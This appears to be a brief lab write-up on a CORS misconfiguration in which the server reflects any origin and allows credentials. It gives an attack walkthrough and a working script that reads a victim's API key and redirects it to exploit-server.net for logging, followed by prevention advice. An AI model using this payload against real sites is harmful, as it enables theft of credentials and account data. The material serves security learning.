Vulnerability:
	The server’s CORS policy reflects any incoming origin and allows credentials, so SOP is effectively bypassed for data reads,
	Allowing an attacker to run a script that could read data / responses from a different origin. 
	
Explanation:
	The attacker is sending a link to the victim to a malicious site.
	The browser is loading the page and running  the script.
	The script is sending a request to the domain he is authenticated too.
	The script then intercept the response containing the victim's API key.
	Then the script surfing to the attacker's website to a non existing  directory named the victims API key.
	The attacker is allowed to read the API value in the logs.
	
Script:
	<script>
		var req = new XMLHttpRequest();
		req.onload = reqListener;
		req.open('get','https://server.net/accountDetails',true);
		req.withCredentials = true;
		req.send();

		function reqListener() {
			const match = this.responseText.match(/"apikey"\s*:\s*"([^"]+)"/);
			const apikey = match ? match[1] : 'not_found';
			location = 'https://exploit-server.net/log?key=' + apikey;
		}
	</script>
	
	
Prevention:
	- Only echo back ACAO if Origin is in your allowed list.
	- Optional: don’t allow credentials from cross-origins unless strictly necessary.
